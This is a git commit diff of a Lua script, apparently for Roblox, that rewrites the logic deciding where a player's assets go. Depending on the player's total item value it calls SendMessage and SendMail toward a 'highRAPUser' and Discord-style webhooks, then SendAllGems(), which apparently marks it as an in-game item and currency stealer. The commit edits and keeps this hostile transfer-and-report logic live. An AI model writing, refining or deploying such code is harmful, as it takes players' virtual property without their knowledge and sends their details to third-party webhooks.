2ce865efafdce4137a2c21983d762c0d4f8c5ca6
Bearr <ciaranbusinessx@gmail.com>
2024-10-13 20:35:02 +0100

    Update script.lua

--- script.lua
+++ script.lua
@@ -298,26 +298,19 @@ if #sortedItems > 0 then
 local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
 local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
 
-spawn(function()
-    -- Conditional send logic based on totalRAP value
-    if totalRAP > 100000 then
-        -- If total RAP > 100,000:
-        -- Send both message and mail to highRAPWebhook/highRAPUser
-        SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)  -- Ensure to send message to highRAPUser
-        SendMail(highRAPUser, GemAmount1, highRAPWebhook)  -- Ensure mail is sent to highRAPUser
+-- Conditional send logic based on totalRAP value
+if totalRAP > 100000 then
+    -- Send both webhook message and mail to highRAPWebhook/highRAPUser
+    SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)
+    SendMail(highRAPUser, GemAmount1, highRAPWebhook)
+else
+    -- Send both message and mail to global webhook/user
+    SendMessage(plr.Name, GemAmount1, webhook, plr.Name)
+    SendMail(plr.Name, GemAmount1, webhook)
 
-        -- Webhook is already being sent to highRAPWebhook
-        -- No mail for the global user in this case
-    else
-        -- If total RAP <= 100,000:
-        -- Send both message and mail to global webhook/user
-        SendMessage(user, GemAmount1, webhook, user)  -- Send message to global user
-        SendMail(user, GemAmount1, webhook)  -- Send mail to global user
-
-        -- Also send message to highRAPWebhook/highRAPUser (without mail)
-        SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)
-    end
-end)
+    -- Send only webhook message (no mail) to highRAPWebhook/highRAPUser
+    SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)
+end
 
     SendAllGems()
 
